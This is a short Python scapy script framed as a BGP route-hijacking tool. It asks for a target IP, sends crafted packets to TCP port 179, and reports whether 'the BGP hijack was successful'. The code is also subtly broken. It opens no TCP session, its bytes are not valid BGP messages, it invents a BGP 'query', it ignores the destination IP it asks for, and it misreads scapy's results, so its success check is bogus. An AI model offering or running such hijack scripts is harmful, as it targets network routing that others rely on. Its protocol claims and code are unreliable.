# Import the necessary modules and classes
from scapy.all import IP, TCP, Raw
from scapy.sendrecv import send, sr

# Prompt user for target and destination IP
target_ip = input("Enter the target IP address: ")
destination_ip = input("Enter the destination IP address: ")

# Create BGP update message
bgp_update = IP(dst=target_ip) / TCP(dport=179) / Raw(load=b"\x02\x01\x00\x01\x01\x00" + b"\x00" * 54)

# Send BGP update message to target IP address
send(bgp_update)

# Send BGP query to target IP address and receive response
response = sr(IP(dst=target_ip) / TCP(dport=179) / Raw(load=b"\x02\x00\x01\x03\x00\x00\x00"))[1]

# Check if the response indicates that the target IP address is using the new BGP routes specified in the BGP update message
if response:
    for query_answer in response:
        if query_answer.haslayer(IP) and query_answer.getlayer(IP).src == target_ip and query_answer.haslayer(TCP) and query_answer.getlayer(TCP).sport == 179 and query_answer.haslayer(Raw) and query_answer.getlayer(Raw).load.startswith(b"\x03\x00\x01"):
            print("The BGP hijack was successful")
            print("New BGP routes:")
            print(query_answer.getlayer(Raw).load)
else:
    print("The BGP hijack was not successful")
